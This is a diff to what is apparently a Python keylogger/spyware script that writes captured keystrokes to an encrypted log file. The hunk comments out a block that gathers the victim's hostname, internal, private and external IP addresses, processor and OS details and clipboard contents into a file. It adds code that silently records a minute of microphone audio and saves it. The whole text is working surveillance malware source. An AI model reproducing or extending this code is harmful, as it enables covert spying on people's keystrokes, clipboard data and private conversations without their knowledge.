@@ -74,29 +74,39 @@ keys_information_enc = 'enc_keys_logged.txt'
 
 # Computer Information
 
-hostname = socket.gethostname()
-internal_IP = socket.gethostbyname(hostname) # Usually returns loopback address
+# hostname = socket.gethostname()
+# internal_IP = socket.gethostbyname(hostname) # Usually returns loopback address
 
-s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
-s.connect(("8.8.8.8", 80))
-private_IP = s.getsockname()[0] # Will return the private IP of the machine
+# s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
+# s.connect(("8.8.8.8", 80))
+# private_IP = s.getsockname()[0] # Will return the private IP of the machine
 
-external_IP = get('https://api.ipify.org').text
+# external_IP = get('https://api.ipify.org').text
 
-processor_info = platform.processor()
-system_info, system_ver = platform.system(), platform.version()
-machine_info = platform.machine()
+# processor_info = platform.processor()
+# system_info, system_ver = platform.system(), platform.version()
+# machine_info = platform.machine()
 
-f = open(system_information, 'a')
+# f = open(system_information, 'a')
 
-f.write('Hostname: ' + hostname + '\n' +
-        'Internal IP: ' + internal_IP + '\n' +
-        'Private IP: ' + private_IP + '\n' +
-        'External IP: ' + external_IP + '\n' +
-        'Processor Info: ' + processor_info + '\n' +
-        'System Info: ' + system_info + '\n' + 
-        'System Version: ' + system_ver + '\n' +
-        'Machine Info: ' + machine_info + '\n' +
-        'Clipboard Contents: ' + '\n\t' + clipboard.paste() + '\n')
+# f.write('Hostname: ' + hostname + '\n' +
+#         'Internal IP: ' + internal_IP + '\n' +
+#         'Private IP: ' + private_IP + '\n' +
+#         'External IP: ' + external_IP + '\n' +
+#         'Processor Info: ' + processor_info + '\n' +
+#         'System Info: ' + system_info + '\n' + 
+#         'System Version: ' + system_ver + '\n' +
+#         'Machine Info: ' + machine_info + '\n' +
+#         'Clipboard Contents: ' + '\n\t' + clipboard.paste() + '\n')
 
-f.close()
+# f.close()
+
+# Microphone
+
+sampling_freq = 44100
+duration = 60
+
+myrecording = sd.rec(int(duration * sampling_freq), samplerate=sampling_freq, channels=2)
+sd.wait()
+
+write(audio_information, sampling_freq, myrecording)
